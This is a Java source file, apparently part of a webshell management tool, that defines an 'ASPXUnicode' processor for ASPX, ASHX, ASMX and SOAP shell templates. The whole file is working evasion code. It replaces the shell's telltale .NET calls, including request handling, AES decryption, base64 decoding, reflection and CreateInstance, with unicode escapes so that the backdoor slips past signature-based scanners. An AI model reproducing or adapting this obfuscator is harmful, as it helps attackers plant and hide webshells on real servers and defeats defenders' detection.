package core.shellprocessor.aspxUnicode;

import core.annotation.GenerateProcessor;
import core.imp.ShellProcessor;

@GenerateProcessor(
        DisplayName = "Unicode",
        superTemplate = {"aspx", "ashx", "asmx", "soap"}
)
public class ASPXUnicode implements ShellProcessor {
    public ASPXUnicode() {
    }

    public static String string2Unicode(String str) {
        StringBuffer unicode = new StringBuffer();

        for(int i = 0; i < str.length(); ++i) {
            char c = str.charAt(i);
            if (String.valueOf(c).equals(".")) {
                unicode.append(c);
            } else {
                unicode.append("\\u00" + Integer.toHexString(c));
            }
        }

        return unicode.toString();
    }

    public static String encoderAspx(String text) {
        String[] list = new String[]{"BinaryRead", "ContentLength", "Context.Request", "Context.Response", "Context.Session", "BinaryWrite", "ComputeHash", "CreateDecryptor", "CreateEncryptor", "Cryptography", "GetMethod", "MD5CryptoServiceProvider", "RijndaelManaged", "System.BitConverter", "System.Convert", "FromBase64String", "ToBase64String", "System.IO.MemoryStream", "System.Reflection", "Assembly", "System.Security", "System.Text.Encoding.Default.GetBytes", "System.Type", "ToString", "TransformFinalBlock", "magicNum1", "magicNum2", "CreateInstance"};
        String result = text;

        for(int i = 0; i < list.length; ++i) {
            String s = list[i];
            int index = text.indexOf(s);
            if (index != -1) {
                result = result.replace(s, string2Unicode(s));
            }
        }

        return result;
    }

    public byte[] doProcessor(byte[] shell, String suffix) {
        String shellContent = new String(shell);
        shellContent = encoderAspx(shellContent);
        return shellContent.getBytes();
    }
}
